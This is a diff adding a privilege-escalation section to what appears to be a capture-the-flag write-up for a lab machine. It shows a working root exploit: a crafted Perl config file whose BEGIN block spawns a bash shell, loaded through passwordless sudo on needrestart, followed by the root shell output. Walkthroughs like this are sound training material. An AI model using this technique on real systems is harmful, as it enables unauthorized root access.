@@ -159,5 +159,35 @@ User fismathack may run the following commands on conversor:
     (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
 ```
 
+We can run the /usr/sbin/needrestart utility as root without providing a password. needrestart is a tool written natively in Perl.
 
+Instead of relying on unstable environment variable hijacking (like PYTHONPATH), we can exploit how needrestart parses its configuration files. In Perl, configuration files are often evaluated directly as source code. We can abuse this by creating a custom configuration file containing a BEGIN block.
+
+A BEGIN block tells the Perl interpreter to execute the enclosed code immediately during the compilation phase, before the rest of the script even runs.
+
+I crafted a malicious .conf file in the /tmp directory:
+
+```bash
+cat << 'EOF' > /tmp/exploit.conf
+BEGIN { system("/bin/bash -p") }
+%nrconf = (
+    verbosity => 0,
+    restart => 'a'
+);
+EOF
+```
+To execute the exploit, we leverage the -c flag, which forces needrestart to load our custom configuration file instead of the default one:
+
+```bash
+sudo /usr/sbin/needrestart -c /tmp/exploit.conf
+```
+
+The moment the command was executed, the Perl interpreter read the configuration, parsed the BEGIN block, and spawned a privileged bash shell as root.
+
+```bash
+root@conversor:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@conversor:~# cat /root/root.txt
+[REDACTED]
+```
 
